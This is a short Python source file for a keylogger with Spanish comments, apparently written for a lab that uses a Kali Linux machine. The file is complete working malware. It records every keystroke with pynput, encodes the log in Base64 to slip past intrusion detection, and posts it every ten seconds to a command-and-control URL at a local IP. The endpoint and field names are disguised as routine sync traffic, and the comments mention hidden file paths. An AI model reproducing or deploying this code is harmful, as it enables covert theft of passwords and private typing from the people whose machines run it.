import pynput.keyboard
import requests
import threading
import os
import base64

# CONFIGURACIÓN TÉCNICA (C2) [cite: 81]
# Cambia esta IP por la de tu Kali Linux
C2_URL = "http://192.168.56.20:5000/data_sync" 
LOG_FILE = "/tmp/.sys_cache" # Archivo oculto para persistencia temporal

class AdvancedKeylogger:
    def __init__(self):
        self.log = ""
        self.path = os.path.expanduser("~/.local/share/system-service") # Ruta de mimetización 

    def _append_to_log(self, string):
        self.log += string

    def _process_keys(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self._append_to_log(current_key)

    def _send_to_c2(self):
        if self.log:
            try:
                # Ofuscación simple: los datos viajan en Base64 para evadir IDS 
                payload = base64.b64encode(self.log.encode()).decode()
                requests.post(C2_URL, data={'sync_token': payload}, timeout=5)
                self.log = ""
            except Exception:
                pass
        # Envío dinámico cada 10 segundos para simular tráfico real 
        timer = threading.Timer(10, self._send_to_c2)
        timer.daemon = True
        timer.start()

    def start(self):
        # Inicia el listener de teclado
        keyboard_listener = pynput.keyboard.Listener(on_press=self._process_keys)
        with keyboard_listener:
            self._send_to_c2()
            keyboard_listener.join()

if __name__ == "__main__":
    kl = AdvancedKeylogger()
    kl.start()